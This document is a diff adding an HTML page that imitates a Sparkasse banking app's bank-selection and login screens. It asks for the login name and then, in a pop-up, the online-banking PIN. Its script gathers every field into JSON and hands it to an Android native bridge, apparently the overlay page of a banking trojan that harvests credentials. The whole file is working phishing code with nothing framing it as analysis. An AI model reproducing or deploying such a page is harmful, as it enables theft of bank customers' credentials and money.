@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>sparkasse</title>
+    <link rel="shortcut icon" href="com.starfinanz.smob.android.sfinanzstatus.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #e5e5e5;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+    }
+    .logo {
+text-align: center; background-size: 100%; padding: 10px 0px 10px 0px; background: none; color: #fff; font-weight: 400; text-decoration: none; background: red;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    color: #6c6b6b;
+    text-align: left;
+    outline: none;
+    background: #ffffff;
+    border-top: none;
+    border-left: none;
+    border-right: none;
+    border-bottom: 1px solid lightgrey;
+    margin: 0 auto;
+    padding-left: 10px;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #ffffff;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #1652f0;
+    border-radius: 10px;
+}
+input::placeholder {
+    color: #a5a2a2;
+    font-size: 15px;
+}
+input:disabled {
+    left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #2a2929;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #cecece;
+    border-radius: 10px;
+}
+input[type="checkbox"] {
+    display: none;
+}
+
+/* стили для метки */
+input[type="checkbox"] + label {
+    cursor: pointer;
+    padding-left: 50px;
+    position: relative;
+    font-family: tahoma, sans-serif, arial;
+    line-height: 40px;
+}
+
+/* стили для поля с бегунком*/
+input[type="checkbox"] + label::before {
+content: "";
+    display: inline-block;
+    position: absolute;
+    top: 0;
+    left: 0;
+    vertical-align: middle;
+    padding: 0;
+    height: 24px;
+    width: 45px;
+    margin: 0 5px 0 0;
+    border: 1px solid #d7d7d7;
+    border-radius: 12px;
+    background: #fcfcfc;
+}
+
+/* стили для бегунка*/
+input[type="checkbox"] + label::after {
+content: "";
+    display: block;
+    position: absolute;
+    top: -0.5px;
+    left: 1px;
+    width: 25px;
+    height: 25px;
+    border-radius: 22px;
+    background: #ffffff;
+    border: 1px solid #dadada;
+    box-shadow: 0 3px 3px rgba(140, 140, 140, .1);
+}
+
+/* плавность )) */
+input[type="checkbox"] + label::before,
+input[type="checkbox"] + label::after {
+    -webkit-transition: all .2s ease-out;
+    transition: all .2s ease-out;
+}
+
+/* чекнутое состояние )) */
+input[type="checkbox"]:checked + label::before {
+    background: #6edc5f;
+    border-color: #6dd75e;
+}
+input[type="checkbox"]:checked + label::after {
+    left: 22px;
+}
+.Window {
+ position: fixed;
+ top: 0;
+ right: 0;
+ bottom: 0;
+ left: 0;
+ background: rgba(91, 91, 91, 0.7);
+ z-index: 99999;
+ -webkit-transition: opacity 400ms ease-in;
+ -moz-transition: opacity 400ms ease-in;
+ transition: opacity 400ms ease-in;
+ display: none;
+ pointer-events: none;
+}
+
+.Window:target {
+ display: block;
+ pointer-events: auto;
+}
+
+.Window > div {
+    width: auto;
+    position: relative;
+    margin: 80px 10px 0px 10px;
+    padding: 20px 20px 1px 20px;
+    border-radius: 20px;
+    background: #efefef;
+}
+
+.close {
+ background: #cc3300;
+ color: #FFFFFF;
+ line-height: 25px;
+ position: absolute;
+ right: -12px;
+ text-align: center;
+ top: -10px;
+ width: 24px;
+ text-decoration: none;
+ font-weight: bold;
+ -webkit-border-radius: 12px;
+ -moz-border-radius: 12px;
+ border-radius: 12px;
+ -moz-box-shadow: 1px 1px 3px #000;
+ -webkit-box-shadow: 1px 1px 3px #000;
+ box-shadow: 1px 1px 3px #000;
+}
+.close:hover { background: #990000; }
+</style>
+
+<fieldset id="formtosend">
+
+<div id="home" style="display: block;">
+
+<div class="logo">
+<span style="display: inline-block;padding-left: 10px;float: left;">Cancel</span>
+<span style="    display: inline-block;">Select financial institution</span>
+<a href="#" style="display: inline-block;padding-right: 10px;float: right; text-decoration: none; color: #fff;" onclick="show_login()">Next</a>
+</div>
+
+<span style="padding-top: 20px; display: block; color: #8d8a8a;">Please enter name, the routing number or BIC here.</span>
+
+
+<div style="padding-top: 20px;">
+
+<input type="text" name="zip" id="zip" onkeyup="check2()">
+
+</div>
+
+<script type="text/javascript">
+    function show_login() {
+        document.getElementById("home").style.display="none";
+        document.getElementById("logpage").style.display="block";
+    }
+</script>
+
+</div>
+
+<div id="logpage" style="display: none;">
+
+<div class="logo">
+<span style="display: inline-block;padding-left: 10px;float: left;">Select financial institution</span>
+<span style="    display: inline-block;"></span>
+<a href="#ModalOpen" style="display: inline-block;padding-right: 10px;float: right; text-decoration: none; color: #fff;" onclick="show_pin()">Next</a>
+</div>
+
+<div style="padding-top: 20px;">
+
+<input type="text" name="login" id="login" placeholder="Login name" onkeyup="check2()">
+
+ <div id="ModalOpen" class="Window">
+ <div>
+ <p><b>Online-Banking PIN</b></p>
+ <p>Please enter your online banking PIN to retrieve your account data.</p>
+ <p>
+     <input type="password" name="pin" placeholder="Online-Banking PIN" style="border-radius: 10px; border: 1px solid #dfdddd; height: 35px;">
+     <hr style="border: 0.3px solid #c8c8c8;">
+     <a href="#" style="text-decoration: none; color: #2196F3;" onclick="send_form()">OK</a>
+     <hr style="border: 0.5px solid #c8c8c8;">
+     <a href="#" style="text-decoration: none; color: #2196F3;">Save PIN</a>
+     <hr style="border: 0.5px solid #c8c8c8;">
+     <a href="#" style="text-decoration: none; color: #2196F3;">Cancel</a>
+ </p>
+ </div>
+ </div>
+<input name="exit" type="hidden" text="true"/>
+<span style="color: #8d8a8a; font-size: 15px; padding-top: 30px; display: block; text-align: left; padding-left: 10px;">Bitte geben Sie für die Einrichtung lhrer Sparkassen-Konten lhren Anmeldenamen ein und klicken Sie auf "Weiter".</span>
+
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        returnResult : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+    var form = document.getElementById('formtosend');
+    Android.returnResult( formToJSONbyName(form) );
+}
+</script>
+
+</body>
+</html>
